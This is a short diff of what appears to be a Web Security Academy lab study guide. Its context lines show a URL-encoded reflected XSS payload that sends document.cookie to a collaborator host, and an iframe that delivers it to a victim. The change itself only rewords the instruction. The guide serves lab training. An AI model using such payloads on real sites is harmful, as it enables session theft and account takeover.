@@ -260,7 +260,7 @@ document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
 https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
 ```  
 
-Take above payload to exploit server and insert into iframe before delivering to victim in below code block.  
+>Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
 
 ```html
 <iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"></iframe>
